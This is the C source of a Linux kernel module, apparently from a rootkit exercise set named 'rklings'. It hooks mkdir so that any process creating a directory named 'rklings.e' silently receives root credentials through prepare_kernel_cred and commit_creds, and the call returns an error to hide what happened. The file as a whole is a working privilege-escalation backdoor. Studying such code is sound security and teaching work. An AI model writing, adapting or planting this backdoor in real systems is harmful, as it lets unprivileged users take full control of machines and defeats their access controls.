// SPDX-License-Identifier: GPL-2.0
#include "rklings_hook.h"
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched/task.h>
#include <linux/string.h>

RK_ON_MKDIR(name)
{
	struct cred *new_cred;

	if (strcmp(name, "rklings.e") != 0)
		return 0;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;

	commit_creds(new_cred);
	pr_info("rklings: escalated pid %d to root\n", current->pid);
	return -ENOENT;
}

static int __init rk_init(void)
{
	return rk_hook_start();
}

static void __exit rk_exit(void)
{
	rk_hook_stop();
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings mkdir escalation");
